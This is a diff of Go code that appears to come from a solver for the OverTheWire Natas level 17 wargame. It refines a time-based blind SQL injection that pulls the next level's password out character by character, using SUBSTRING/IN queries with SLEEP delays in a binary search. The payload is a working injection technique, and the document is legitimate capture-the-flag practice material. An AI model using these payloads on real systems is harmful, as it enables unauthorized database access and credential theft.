@@ -404,10 +404,18 @@ func Init() {
 			}
 			//fmt.Println(passed)
 		}
+
+		splitString := func(s string) (string, string) {
+			half := len(s) / 2
+			letters1 := s[:half]
+			letters2 := s[half:]
+			return letters1, letters2
+		}
+
 		for i := 0; i < 32; i++ {
-			for _, v := range letters {
-				letter := string(v)
-				req, _ := http.NewRequest("POST", "http://natas17.natas.labs.overthewire.org/index.php", bytes.NewBuffer([]byte(`username=natas18" and password LIKE BINARY "`+newPass+letter+`%" AND SLEEP(0.2); #"`)))
+			letters1, letters2 := splitString(letters)
+			for len(letters1) > 0 && len(letters2) > 0 {
+				req, _ := http.NewRequest("POST", "http://natas17.natas.labs.overthewire.org/index.php", bytes.NewBuffer([]byte(`username=natas18" and BINARY SUBSTRING(password, `+strconv.Itoa(i+1)+`, 1)  IN ('`+strings.Join(strings.Split(letters1, ""), `','`)+`') AND SLEEP(0.2); #"`)))
 				req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
 				req.SetBasicAuth(username, password)
 				start := time.Now()
@@ -415,13 +423,25 @@ func Init() {
 				passed := time.Since(start)
 				if err == nil {
 					if passed > time.Millisecond*400 {
-						newPass = newPass + letter
-						fmt.Print(letter)
-						break
+						if len(letters1) == 1 {
+							newPass = newPass + letters1
+							fmt.Print(letters1)
+							break
+						}
+						letters1, letters2 = splitString(letters1)
+					} else {
+						if len(letters2) == 1 {
+							newPass = newPass + letters2
+							fmt.Print(letters2)
+							break
+						}
+						letters1, letters2 = splitString(letters2)
 					}
 				}
 			}
+
 		}
+
 		return newPass
 	})
 
